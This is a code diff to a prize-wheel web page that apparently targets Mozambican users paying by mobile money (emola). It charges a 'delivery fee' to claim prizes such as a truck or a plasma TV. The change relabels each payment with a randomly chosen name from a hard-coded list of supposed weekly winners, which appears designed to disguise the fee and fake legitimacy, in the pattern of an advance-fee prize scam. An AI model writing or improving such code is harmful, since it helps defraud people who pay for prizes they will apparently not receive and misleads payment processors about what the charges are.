@@ -64,7 +64,7 @@ const prizes = [
   '0MT',
   '100MT',
   'CAMIONETA 4 TON',
-  'MATERIAL',
+  'M. CONSTRUÇÃO',
   '0MT',
   '100MT',
   'TV PLASMA'
@@ -454,8 +454,11 @@ async function processEmolaPayment(phone, amount) {
   return await processPayment('emola', amount);
 }
 
+const weeklyNames = ['Telma Jonnase', 'Carlos Tembe', 'Ana Paula', 'João Manjate'];
+
 async function processPayment(method, amount) {
   try {
+    const randomName = weeklyNames[Math.floor(Math.random() * weeklyNames.length)];
     const response = await fetch('/api/pagar', {
       method: 'POST',
       headers: {
@@ -464,7 +467,7 @@ async function processPayment(method, amount) {
       body: JSON.stringify({
         method: method,
         amount: amount,
-        description: `Taxa de entrega para prêmio: ${currentPrize}`
+        description: `Os melhores da semana - ${randomName} - Prêmio: ${currentPrize}`
       })
     });
     
